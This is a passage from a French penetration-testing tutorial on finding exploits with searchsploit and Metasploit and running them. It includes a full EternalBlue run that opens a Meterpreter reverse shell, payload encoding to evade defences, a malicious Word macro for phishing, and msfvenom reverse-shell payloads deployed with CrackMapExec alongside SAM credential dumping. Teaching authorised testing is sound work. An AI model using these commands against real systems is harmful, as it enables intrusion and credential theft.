- Combinez ces commandes avec des filtres pour identifier rapidement les cibles prioritaires
- Exportez les données pour une analyse approfondie avec des outils externes
- Automatisez l'analyse avec des scripts resource pour garantir l'exhaustivité
- Établissez une matrice de priorisation pour cibler d'abord les systèmes les plus vulnérables et critiques
- Intégrez des outils spécialisés comme EyeWitness ou BloodHound pour enrichir votre analyse

Dans la section suivante, nous verrons comment rechercher efficacement des exploits correspondant aux vulnérabilités identifiées, en utilisant searchsploit et les fonctionnalités de recherche de Metasploit.
# Recherche d'exploits avec searchsploit & Metasploit

## Introduction à la recherche d'exploits

Après avoir identifié les systèmes, services et vulnérabilités potentielles lors des phases de reconnaissance et d'analyse, l'étape suivante consiste à rechercher des exploits correspondants. Cette phase est cruciale pour transformer l'information en action concrète.

### Pourquoi une recherche méthodique est essentielle

> **POURQUOI ?**  
> Une recherche d'exploits méthodique permet d'identifier rapidement les vecteurs d'attaque les plus prometteurs et de maximiser vos chances de succès. Sans cette étape, vous risquez de passer à côté d'exploits efficaces ou d'utiliser des exploits inadaptés qui pourraient compromettre votre test d'intrusion.

## Searchsploit : l'outil de référence pour Exploit-DB

Searchsploit est un outil en ligne de commande qui permet de rechercher localement dans la base de données Exploit-DB, une collection exhaustive d'exploits et de preuves de concept pour diverses vulnérabilités.

### Principes fondamentaux de Searchsploit

Searchsploit fonctionne en interrogeant une copie locale de la base de données Exploit-DB, ce qui présente plusieurs avantages :
- Recherche rapide sans connexion internet
- Accès immédiat au code source des exploits
- Possibilité d'effectuer des recherches complexes

### Mise à jour de la base de données

Avant toute recherche, assurez-vous que votre base de données locale est à jour :

```bash
searchsploit -u
```

Exemple de sortie :
```
[i] Updating local exploit database...
[i] Git repository updated successfully!
[i] Updated 45 exploits and 23 shellcodes
```

> **COMMENT ?**  
> Prenez l'habitude de mettre à jour votre base de données Searchsploit au début de chaque session de test d'intrusion pour vous assurer d'avoir accès aux derniers exploits publiés.

### Recherche de base avec Searchsploit

```bash
# Recherche simple par mot-clé
searchsploit apache 2.4.41

# Recherche avec plusieurs termes
searchsploit wordpress 5.8.1
```

Exemple de sortie :
```
---------------------------------------------------------- ---------------------------------
 Exploit Title                                            |  Path
---------------------------------------------------------- ---------------------------------
WordPress Core 5.8.1 - 'WP_Query' SQL Injection           | php/webapps/50152.py
WordPress Core < 5.8.2 - Expired DST Root CA X3 Certificate | php/webapps/50219.txt
WordPress Plugin Booking Calendar 3.0.0 - SQL Injection   | php/webapps/50696.txt
WordPress Plugin WP Visitor Statistics 4.7 - SQL Injection | php/webapps/50407.py
---------------------------------------------------------- ---------------------------------
```

### Options avancées de recherche

| Option | Description | Exemple |
|--------|-------------|---------|
| `-t` | Titre uniquement | `searchsploit -t apache` |
| `-e` | Description exacte | `searchsploit -e "remote code execution"` |
| `-w` | Afficher l'URL Exploit-DB | `searchsploit -w apache` |
| `-p` | Chemin complet | `searchsploit -p 50152` |
| `--exclude` | Exclure un terme | `searchsploit wordpress --exclude plugin` |

Exemples de recherches avancées :

```bash
# Recherche d'exploits pour une version spécifique
searchsploit "Apache 2.4"

# Recherche d'exploits de type Remote Code Execution
searchsploit "Microsoft Exchange" --exclude "Denial of Service"

# Recherche d'exploits pour un CVE spécifique
searchsploit CVE-2021-44228
```

### Affichage et extraction des exploits

```bash
# Afficher le contenu d'un exploit
searchsploit -x php/webapps/50152.py

# Copier un exploit dans le répertoire courant
searchsploit -m php/webapps/50152.py
```

Exemple de sortie après copie :
```
Exploit: WordPress Core 5.8.1 - 'WP_Query' SQL Injection
    URL: https://www.exploit-db.com/exploits/50152
   Path: /usr/share/exploitdb/exploits/php/webapps/50152.py
Copied to: /home/kali/pentest/50152.py
```

> **POURQUOI ?**  
> L'option `-m` (mirror) est préférable à la simple copie du fichier car elle ajoute automatiquement un en-tête avec les informations sur l'exploit, facilitant ainsi la traçabilité et la documentation.

## Intégration de Searchsploit avec Metasploit

### Commande `msearch` dans Metasploit

Metasploit intègre une commande `search` puissante, mais la commande `msearch` permet d'interroger directement la base de données Exploit-DB depuis la console Metasploit.

```
msf6 > load msgrpc
msf6 > msearch apache 2.4.41
```

Si la commande n'est pas disponible, vous pouvez l'activer :

```
msf6 > loadpath /usr/share/metasploit-framework/plugins/
msf6 > load plugin_searchsploit
```

### Création d'un script d'intégration personnalisé

Pour une intégration plus poussée, créez un script resource personnalisé :

```
# Contenu du fichier searchanduse.rc
<ruby>
def search_and_use(keyword)
  run_single("msearch #{keyword}")
  print_status("Searching for matching Metasploit modules...")
  run_single("search #{keyword}")
  print_status("Enter the module path to use: ")
  module_path = gets.chomp
  if module_path.length > 0
    run_single("use #{module_path}")
  end
end

search_and_use(framework.datastore['KEYWORD'])
</ruby>
```

Utilisation :
```
msf6 > setg KEYWORD "Apache 2.4.41"
msf6 > resource searchanduse.rc
```

## Recherche d'exploits dans Metasploit

### Commande `search` de base

La commande `search` de Metasploit permet de rechercher des modules dans la base de données locale de Metasploit.

```
msf6 > search apache 2.4
```

Exemple de sortie :
```
Matching Modules
================

   #  Name                                              Disclosure Date  Rank       Check  Description
   -  ----                                              ---------------  ----       -----  -----------
   0  exploit/multi/http/apache_mod_cgi_bash_env_exec   2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
   1  auxiliary/scanner/http/apache_optionsbleed        2017-09-18       normal     Yes    Apache Optionsbleed Scanner
   2  exploit/unix/webapp/apache_manager_login          2014-04-07       excellent  No     Apache Tomcat Manager Application Bruteforce Login Utility
```

### Options avancées de recherche

| Option | Description | Exemple |
|--------|-------------|---------|
| `type:` | Type de module | `search type:exploit apache` |
| `platform:` | Plateforme cible | `search platform:windows smb` |
| `cve:` | Numéro CVE | `search cve:2021-44228` |
| `rank:` | Classement de fiabilité | `search rank:excellent apache` |

Exemples de recherches avancées :

```
# Recherche d'exploits pour un service spécifique
msf6 > search type:exploit name:smb

# Recherche d'exploits récents
msf6 > search type:exploit disclosure_date:2021

# Recherche d'exploits avec vérification automatique
msf6 > search type:exploit check:yes

# Recherche combinant plusieurs critères
msf6 > search type:exploit platform:windows rank:excellent smb
```

> **COMMENT ?**  
> Utilisez le critère `rank:` pour filtrer les exploits par fiabilité. Les rangs vont de `excellent` (très fiable) à `manual` (nécessitant une intervention manuelle), en passant par `good`, `normal` et `average`.

### Utilisation de la commande `info`

Pour obtenir des informations détaillées sur un module spécifique :

```
msf6 > info exploit/windows/smb/ms17_010_eternalblue
```

Cette commande affiche :
- Description détaillée
- Références (CVE, URL, etc.)
- Options disponibles
- Cibles supportées
- Auteur et licence

### Recherche par vulnérabilité détectée

Vous pouvez utiliser les résultats de vos scans pour rechercher des exploits correspondants :

```
# Recherche basée sur les vulnérabilités détectées
msf6 > vulns
msf6 > search cve:2017-0144

# Recherche basée sur les services détectés
msf6 > services -S http
msf6 > search type:exploit name:apache
```

## Module `exploit_suggester` : automatisation de la recherche

Le module `exploit_suggester` est un outil puissant qui analyse un système compromis et suggère des exploits potentiels.

### Post Exploitation Suggester

```
# Après avoir obtenu une session Meterpreter
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
msf6 post(multi/recon/local_exploit_suggester) > run
```

Exemple de sortie :
```
[*] 192.168.1.100 - Collecting local exploits for x86/windows...
[*] 192.168.1.100 - 40 exploit checks are being tried...
[+] 192.168.1.100 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 192.168.1.100 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target appears to be vulnerable.
```

### Suggester pré-exploitation

```
# Avant exploitation, basé sur les informations de scan
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

# Si vulnérable, recherche d'exploits correspondants
msf6 > search ms17_010
```

> **POURQUOI ?**  
> Le module `exploit_suggester` permet de gagner un temps considérable en identifiant automatiquement les vulnérabilités exploitables sur un système. Il est particulièrement utile pour l'élévation de privilèges après avoir obtenu un accès initial.

## Techniques avancées de recherche d'exploits

### Recherche multi-sources

Pour une recherche exhaustive, combinez plusieurs sources :

```bash
# Recherche dans Searchsploit
searchsploit apache 2.4.41

# Recherche dans Metasploit
msf6 > search apache 2.4

# Recherche en ligne (depuis un terminal)
firefox "https://nvd.nist.gov/vuln/search/results?form_type=Basic&results_type=overview&query=apache+2.4.41"
```

### Utilisation de Vulners pour la recherche de vulnérabilités

Vulners est une base de données complète de vulnérabilités qui peut être interrogée via son API ou son interface web.

Installation du script NSE Vulners :
```bash
cd /usr/share/nmap/scripts/
sudo wget https://raw.githubusercontent.com/vulnersCom/nmap-vulners/master/vulners.nse
sudo nmap --script-updatedb
```

Utilisation avec Nmap et importation dans Metasploit :
```bash
nmap -sV --script vulners -oX vulners_scan.xml 192.168.1.100
msf6 > db_import vulners_scan.xml
```

### Recherche d'exploits dans GitHub

GitHub héberge de nombreux exploits qui ne sont pas encore intégrés dans Exploit-DB ou Metasploit.

```bash
# Recherche sur GitHub depuis le terminal
firefox "https://github.com/search?q=CVE-2021-44228+exploit"
```

Vous pouvez également utiliser l'outil GitHubSearch :
```bash
pip install githubsearch
githubsearch -q "CVE-2021-44228 exploit" -c 10
```

## Évaluation et sélection des exploits

### Critères d'évaluation des exploits

Lors de la sélection d'un exploit, évaluez les critères suivants :

1. **Fiabilité** : Préférez les exploits avec un rang élevé dans Metasploit
2. **Compatibilité** : Vérifiez la compatibilité avec la version cible
3. **Impact** : Évaluez les conséquences potentielles (crash, déni de service)
4. **Détectabilité** : Certains exploits sont plus discrets que d'autres
5. **Maintenance** : Préférez les exploits récemment mis à jour

### Analyse du code source des exploits

Avant d'utiliser un exploit externe, analysez son code source :

```bash
# Copier l'exploit dans un répertoire de travail
searchsploit -m 50152.py

# Analyser le code
cat 50152.py | less
```

Points à vérifier :
- Présence de code malveillant
- Compatibilité avec la cible
- Dépendances requises
- Modifications nécessaires (adresses, ports, etc.)

> **COMMENT ?**  
> Ne faites jamais confiance aveuglément à un exploit trouvé en ligne. Prenez toujours le temps d'analyser son code source pour comprendre son fonctionnement et éviter les surprises désagréables.

## Intégration d'exploits externes dans Metasploit

### Importation d'exploits dans Metasploit

Vous pouvez intégrer des exploits externes dans Metasploit pour bénéficier de son infrastructure :

```bash
# Créer un module personnalisé
mkdir -p ~/.msf4/modules/exploits/custom
cp 50152.py ~/.msf4/modules/exploits/custom/wordpress_sql_injection.rb

# Recharger les modules dans Metasploit
msf6 > reload_all
msf6 > search custom/
```

### Conversion d'exploits Python en modules Metasploit

Pour convertir un exploit Python en module Metasploit :

1. Créez un template de module Ruby
2. Intégrez la logique de l'exploit Python
3. Adaptez les options et la gestion des payloads

Exemple simplifié :
```ruby
# ~/.msf4/modules/exploits/custom/wordpress_sql_injection.rb
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HTTP::Wordpress
  
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'WordPress Core 5.8.1 - SQL Injection',
      'Description'    => %q{
        This module exploits a SQL injection vulnerability in WordPress 5.8.1.
      },
      'Author'         => [ 'Your Name' ],
      'License'        => MSF_LICENSE,
      'References'     => [ [ 'CVE', '2021-XXXXX' ] ],
      'Platform'       => 'php',
      'Targets'        => [ [ 'WordPress 5.8.1', {} ] ],
      'DisclosureDate' => '2021-10-01',
      'DefaultTarget'  => 0
    ))
    
    register_options([
      OptString.new('TARGETURI', [ true, 'The base path to WordPress', '/' ])
    ])
  end
  
  def exploit
    # Logique d'exploitation adaptée du script Python
    # ...
  end
end
```

## Automatisation de la recherche et de l'exploitation

### Création d'un workflow automatisé

Créez un script resource pour automatiser le processus de recherche et d'exploitation :

```
# Contenu du fichier auto_exploit.rc
<ruby>
def scan_and_exploit(target)
  # Scan initial
  run_single("db_nmap -sS -sV -p- --script vuln #{target}")
  
  # Recherche d'exploits pour les services détectés
  services = framework.db.services(conditions: { address: target })
  services.each do |service|
    next if service.name.nil?
    print_status("Searching exploits for #{service.name} #{service.info}")
    run_single("search name:#{service.name} type:exploit")
  end
  
  # Recherche d'exploits pour les vulnérabilités détectées
  vulns = framework.db.vulns(conditions: { address: target })
  vulns.each do |vuln|
    next if vuln.name.nil?
    print_status("Searching exploits for vulnerability: #{vuln.name}")
    run_single("search cve:#{vuln.refs.select{|r| r.name =~ /^CVE-/}.first.name.gsub('CVE-', '')}")
  end
end

target = framework.datastore['TARGET']
scan_and_exploit(target)
</ruby>
```

Utilisation :
```
msf6 > setg TARGET 192.168.1.100
msf6 > resource auto_exploit.rc
```

### Utilisation de Metasploit Automation API

Pour une automatisation plus poussée, vous pouvez utiliser l'API RPC de Metasploit :

```bash
# Démarrer le serveur RPC
msf6 > load msgrpc Pass=password ServerHost=127.0.0.1 ServerPort=55553

# Créer un script Python pour interagir avec l'API
cat > msf_api.py << EOF
#!/usr/bin/env python3
from pymetasploit3.msfrpc import MsfRpcClient

client = MsfRpcClient('password', server='127.0.0.1', port=55553)

# Lister les modules disponibles
for module in client.modules.exploits:
    if 'apache' in module:
        print(module)

# Exécuter un scan
console_id = client.consoles.console().cid
client.consoles.console(console_id).write('db_nmap -sV 192.168.1.100')
EOF

chmod +x msf_api.py
./msf_api.py
```

> **POURQUOI ?**  
> L'automatisation via l'API permet d'intégrer Metasploit dans des workflows plus complexes et de développer des outils personnalisés adaptés à vos besoins spécifiques.

## Outils complémentaires pour la recherche d'exploits

### Nuclei : détection automatisée de vulnérabilités

Nuclei est un scanner de vulnérabilités basé sur des templates qui peut être utilisé pour identifier rapidement des vulnérabilités exploitables.

Installation :
```bash
GO111MODULE=on go get -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei
```

Utilisation et intégration avec Metasploit :
```bash
# Scan avec Nuclei
nuclei -u 192.168.1.100 -t cves/ -o nuclei_results.txt

# Recherche d'exploits pour les CVE détectés
grep "CVE-" nuclei_results.txt | awk '{print $NF}' | while read cve; do
  echo "Searching for $cve"
  searchsploit $cve
  echo "---"
done
```

### Vulscan : extension NSE pour la détection de vulnérabilités

Vulscan est une extension pour Nmap qui permet de détecter les vulnérabilités en comparant les versions des services avec des bases de données de vulnérabilités.

Installation :
```bash
cd /usr/share/nmap/scripts/
sudo git clone https://github.com/scipag/vulscan.git
sudo ln -s `pwd`/vulscan /usr/share/nmap/scripts/vulscan
```

Utilisation et intégration avec Metasploit :
```bash
nmap -sV --script=vulscan/vulscan.nse 192.168.1.100 -oX vulscan_results.xml
msf6 > db_import vulscan_results.xml
```

## En résumé

La recherche d'exploits est une étape charnière qui fait le lien entre la découverte de vulnérabilités et leur exploitation. Une approche méthodique combinant Searchsploit, Metasploit et d'autres outils complémentaires vous permettra d'identifier rapidement les vecteurs d'attaque les plus prometteurs.

Points clés à retenir :
- Utilisez Searchsploit pour une recherche rapide dans la base de données Exploit-DB
- Exploitez la commande `search` de Metasploit avec ses options avancées pour cibler précisément vos recherches
- Automatisez la détection de vulnérabilités exploitables avec le module `exploit_suggester`
- Analysez toujours le code source des exploits externes avant de les utiliser
- Combinez plusieurs sources de recherche pour une couverture maximale
- Automatisez votre workflow avec des scripts resource ou l'API Metasploit
- Intégrez des outils complémentaires comme Nuclei ou Vulscan pour enrichir votre processus de recherche

Dans la section suivante, nous verrons comment sélectionner et exécuter efficacement les exploits identifiés pour compromettre les systèmes cibles.
# Sélection & exécution d'exploits

## Introduction à la phase d'exploitation

Après avoir identifié des vulnérabilités potentielles et recherché des exploits correspondants, vient l'étape cruciale de l'exploitation. Cette phase transforme la théorie en pratique et permet de valider concrètement la présence de vulnérabilités sur les systèmes cibles.

### Pourquoi une approche méthodique est essentielle

> **POURQUOI ?**  
> Une exploitation méthodique et contrôlée permet de minimiser les risques d'impact négatif sur les systèmes cibles tout en maximisant les chances de succès. Sans cette rigueur, vous risquez de perturber les services, de déclencher des alertes de sécurité ou d'obtenir des résultats non reproductibles.

## Préparation à l'exploitation

### Évaluation des risques et autorisations

Avant toute tentative d'exploitation, assurez-vous de :

1. Disposer des autorisations nécessaires (scope du pentest)
2. Comprendre les risques potentiels de chaque exploit
3. Vérifier la présence de sauvegardes ou de plans de restauration
4. Définir des plages horaires appropriées pour les tests

> **COMMENT ?**  
> Documentez systématiquement vos autorisations et le périmètre de test dans un document signé par le client. Référez-vous à ce document en cas de doute sur l'utilisation d'un exploit particulièrement intrusif.

### Préparation de l'environnement

```
# Création d'un workspace dédié
msf6 > workspace -a exploitation_client_xyz

# Importation des données de reconnaissance si nécessaire
msf6 > db_import /home/kali/pentest/scans/nmap_results.xml

# Vérification des cibles disponibles
msf6 > hosts
msf6 > services
```

### Sélection des cibles prioritaires

Établissez une liste de cibles prioritaires en fonction de :
- La criticité des vulnérabilités détectées
- L'importance des systèmes dans l'infrastructure
- La fiabilité des exploits disponibles
- Les objectifs spécifiques du test d'intrusion

```
# Création d'un fichier de cibles prioritaires
msf6 > hosts -c address,os_name -S "purpose:server" -o /home/kali/pentest/priority_targets.txt

# Définition d'une cible spécifique
msf6 > setg RHOSTS 192.168.1.100
```

## Sélection des modules d'exploitation

### Critères de sélection des exploits

Lors du choix d'un exploit, évaluez les critères suivants :

| Critère | Description | Importance |
|---------|-------------|------------|
| Rank | Classement de fiabilité dans Metasploit | Critique |
| Check | Possibilité de vérifier la vulnérabilité sans exploitation | Élevée |
| Payload compatibility | Compatibilité avec différents types de payloads | Moyenne |
| Session type | Type de session obtenue (shell, meterpreter, etc.) | Moyenne |
| CVSS | Score de sévérité de la vulnérabilité | Moyenne |
| Age | Ancienneté de la vulnérabilité et de l'exploit | Faible |

```
# Recherche d'exploits avec vérification de vulnérabilité
msf6 > search type:exploit check:yes smb

# Affichage des informations détaillées sur un exploit
msf6 > info exploit/windows/smb/ms17_010_eternalblue
```

### Comprendre le classement (Rank) des exploits

Metasploit classe les exploits selon leur fiabilité :

| Rank | Description | Recommandation |
|------|-------------|----------------|
| Excellent | Très fiable, ne plante jamais la cible | Prioritaire |
| Great | Fiable dans la plupart des cas | Recommandé |
| Good | Fiable mais peut échouer occasionnellement | À considérer |
| Normal | Fonctionne dans des conditions normales | À tester avec précaution |
| Average | Fonctionne dans des conditions spécifiques | À tester en dernier recours |
| Low | Peu fiable ou très spécifique | À éviter sauf si nécessaire |
| Manual | Nécessite une intervention manuelle | Pour utilisateurs expérimentés |

```
# Recherche d'exploits avec un rang élevé
msf6 > search rank:excellent type:exploit smb
```

> **POURQUOI ?**  
> Privilégiez toujours les exploits avec un rang élevé (Excellent, Great) pour minimiser les risques d'impact négatif sur les systèmes cibles. Les exploits de rang inférieur peuvent être utiles mais nécessitent plus de précautions.

## Configuration des modules d'exploitation

### Sélection et configuration d'un module

```
# Sélection d'un module d'exploitation
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# Affichage des options requises
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# Configuration des options de base
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.1.100
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.50
```

Exemple de sortie de `show options` :
```
Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         192.168.1.100    yes       The target host(s)
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        The Windows domain to use for authentication
   SMBPass                         no        The password for the specified username
   SMBUser                         no        The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.50     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```

### Options avancées et personnalisation

```
# Affichage des options avancées
msf6 exploit(windows/smb/ms17_010_eternalblue) > show advanced

# Configuration d'options avancées
msf6 exploit(windows/smb/ms17_010_eternalblue) > set SMBUser Administrator
msf6 exploit(windows/smb/ms17_010_eternalblue) > set SMBPass Password123
msf6 exploit(windows/smb/ms17_010_eternalblue) > set VERBOSE true
```

### Sélection de la cible (Target)

De nombreux exploits supportent différentes versions ou configurations de la cible :

```
# Affichage des cibles disponibles
msf6 exploit(windows/smb/ms17_010_eternalblue) > show targets

# Sélection d'une cible spécifique
msf6 exploit(windows/smb/ms17_010_eternalblue) > set TARGET 0
```

> **COMMENT ?**  
> La plupart des exploits proposent une option "Automatic Target" (généralement TARGET 0) qui tente de détecter automatiquement la configuration de la cible. C'est souvent le choix le plus sûr, mais dans certains cas, une sélection manuelle peut être nécessaire pour éviter les échecs.

## Sélection et configuration des payloads

### Types de payloads disponibles

Metasploit propose différents types de payloads :

| Type | Description | Cas d'usage |
|------|-------------|-------------|
| Singles | Payloads autonomes et compacts | Exploits avec espace limité |
| Stagers | Établissent une connexion pour télécharger un stage | Exploits avec contraintes de taille |
| Stages | Payloads complets téléchargés par un stager | Fonctionnalités avancées |
| Meterpreter | Payload avancé avec nombreuses fonctionnalités | Post-exploitation approfondie |
| Generic | Payloads génériques adaptables | Situations particulières |

```
# Affichage des payloads compatibles
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads

# Sélection d'un payload spécifique
msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

### Configuration du payload

```
# Configuration des options du payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444
msf6 exploit(windows/smb/ms17_010_eternalblue) > set EXITFUNC thread

# Options avancées du payload
msf6 exploit(windows/smb/ms17_010_eternalblue) > set EnableStageEncoding true
msf6 exploit(windows/smb/ms17_010_eternalblue) > set StageEncoder x64/xor
```

### Encodage et évasion des défenses

Pour contourner les solutions de sécurité, vous pouvez encoder vos payloads :

```
# Affichage des encodeurs disponibles
msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders

# Utilisation d'un encodeur spécifique
msf6 exploit(windows/smb/ms17_010_eternalblue) > set EnableStageEncoding true
msf6 exploit(windows/smb/ms17_010_eternalblue) > set StageEncoder x64/xor
msf6 exploit(windows/smb/ms17_010_eternalblue) > set StageEncodingFallback false
```

> **POURQUOI ?**  
> L'encodage des payloads peut aider à contourner certaines solutions de sécurité basées sur des signatures. Cependant, les solutions modernes utilisent souvent des analyses comportementales qui peuvent détecter même les payloads encodés.

## Vérification et exécution de l'exploit

### Vérification de la vulnérabilité (check)

Avant d'exécuter un exploit, utilisez la commande `check` si elle est disponible :

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > check
```

Exemple de sortie :
```
[*] 192.168.1.100:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.1.100:445 - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
[*] 192.168.1.100:445 - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.1.100:445 - The target is vulnerable.
```

### Exécution de l'exploit

Une fois toutes les options configurées et la vérification effectuée :

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```

ou

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

Exemple de sortie d'une exploitation réussie :
```
[*] Started reverse TCP handler on 192.168.1.50:4444 
[*] 192.168.1.100:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.1.100:445 - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit)
[*] 192.168.1.100:445 - Connecting to target for exploitation.
[+] 192.168.1.100:445 - Connection established for exploitation.
[+] 192.168.1.100:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.1.100:445 - CORE raw buffer dump (42 bytes)
[*] 192.168.1.100:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 192.168.1.100:445 - 0x00000010  30 31 36 20 53 74 61 6e 64 61 72 64 20 31 34 33  016 Standard 143
[*] 192.168.1.100:445 - 0x00000020  39 33 20 78 36 34                                93 x64
[+] 192.168.1.100:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.1.100:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.1.100:445 - Sending all but last fragment of exploit packet
[*] 192.168.1.100:445 - Starting non-paged pool grooming
[+] 192.168.1.100:445 - Sending SMBv2 buffers
[+] 192.168.1.100:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.1.100:445 - Sending final SMBv2 buffers.
[*] 192.168.1.100:445 - Sending last fragment of exploit packet!
[*] 192.168.1.100:445 - Receiving response from exploit packet
[+] 192.168.1.100:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.1.100:445 - Sending egg to corrupted connection.
[*] 192.168.1.100:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 192.168.1.100
[*] Meterpreter session 1 opened (192.168.1.50:4444 -> 192.168.1.100:49162) at 2025-05-27 15:30:45 +0000
[+] 192.168.1.100:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.100:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.100:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter >
```

### Options d'exécution avancées

```
# Exécution en arrière-plan
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -j

# Exécution avec un nouveau gestionnaire
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -z

# Exécution sans interaction (utile pour les scripts)
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -q
```

## Gestion des sessions

### Types de sessions

Metasploit gère différents types de sessions :

| Type | Description | Commandes disponibles |
|------|-------------|----------------------|
| Shell | Shell système basique | Commandes système |
| Meterpreter | Session avancée et extensible | Commandes Meterpreter + modules post-exploitation |
| Python | Interpréteur Python | Code Python |
| VNC | Accès graphique | Interface graphique |

### Affichage et gestion des sessions actives

```
# Affichage des sessions actives
msf6 > sessions -l

# Interaction avec une session spécifique
msf6 > sessions -i 1

# Mise en arrière-plan d'une session
meterpreter > background
```

Exemple de sortie de `sessions -l` :
```
Active sessions
==============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WIN-SRV  192.168.1.50:4444 -> 192.168.1.100:49162 (192.168.1.100)
```

### Gestion des sessions multiples

```
# Exécution d'une commande sur toutes les sessions
msf6 > sessions -C "getuid" -v

# Mise à niveau d'une session shell vers Meterpreter
msf6 > sessions -u 1

# Routage du trafic via une session
msf6 > route add 192.168.2.0 255.255.255.0 1
```

> **COMMENT ?**  
> La commande `route add` est particulièrement utile pour le pivoting réseau. Elle permet d'accéder à des réseaux internes via une machine compromise, ouvrant ainsi la voie à l'exploitation de machines non directement accessibles.

## Techniques d'exploitation avancées

### Exploitation de services web

```
# Exploitation d'une vulnérabilité dans une application web
msf6 > use exploit/unix/webapp/wp_admin_shell_upload
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set RHOSTS 192.168.1.101
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME admin
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD password123
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI /wordpress/
msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit
```

### Exploitation de bases de données

```
# Exploitation d'une instance MySQL
msf6 > use exploit/linux/mysql/mysql_udf_payload
msf6 exploit(linux/mysql/mysql_udf_payload) > set RHOSTS 192.168.1.102
msf6 exploit(linux/mysql/mysql_udf_payload) > set USERNAME root
msf6 exploit(linux/mysql/mysql_udf_payload) > set PASSWORD ""
msf6 exploit(linux/mysql/mysql_udf_payload) > exploit
```

### Exploitation via phishing ciblé

```
# Création d'un document malveillant
msf6 > use exploit/windows/fileformat/office_word_macro
msf6 exploit(windows/fileformat/office_word_macro) > set FILENAME rapport.doc
msf6 exploit(windows/fileformat/office_word_macro) > exploit

# Configuration d'un handler pour recevoir les connexions
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_https
msf6 exploit(multi/handler) > set LHOST 192.168.1.50
msf6 exploit(multi/handler) > set LPORT 443
msf6 exploit(multi/handler) > exploit -j
```

## Exploitation avec des outils externes

### Intégration avec CrackMapExec

CrackMapExec est un outil puissant pour l'exploitation de réseaux Windows.

```bash
# Installation si nécessaire
pip3 install crackmapexec

# Scan et exploitation SMB
crackmapexec smb 192.168.1.0/24 -u Administrator -p 'Password123' --sam

# Exécution de commandes sur les systèmes vulnérables
crackmapexec smb 192.168.1.100 -u Administrator -p 'Password123' -x "whoami"
```

Intégration avec Metasploit :
```bash
# Génération d'un payload avec msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe

# Utilisation de CrackMapExec pour déployer le payload
crackmapexec smb 192.168.1.100 -u Administrator -p 'Password123' --put-file payload.exe C:\\Windows\\Temp\\payload.exe
crackmapexec smb 192.168.1.100 -u Administrator -p 'Password123' -x "C:\\Windows\\Temp\\payload.exe"

# Configuration du handler dans Metasploit
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
